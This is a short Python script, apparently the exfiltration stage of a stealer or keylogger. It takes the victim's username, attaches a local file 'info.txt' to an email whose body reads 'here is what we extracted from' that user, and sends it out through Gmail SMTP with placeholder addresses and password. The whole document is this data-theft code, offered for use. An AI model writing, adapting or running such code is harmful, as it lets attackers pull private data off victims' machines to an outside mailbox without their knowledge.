import smtplib
import getpass
import ctypes
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

fromaddr = "FROM@GMAIL.COM"
toaddr = 'TO@GMAIL.COM'
name = getpass.getuser()

msg = MIMEMultipart()

msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = name

body = "here is what we extracted from "+name

msg.attach(MIMEText(body, 'plain'))

filename = "info.txt"
attachment = open("info.txt", "rb")

part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

msg.attach(part)

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(fromaddr, "PASSWORD")
text = msg.as_string()
server.sendmail(fromaddr, toaddr, text)
server.quit()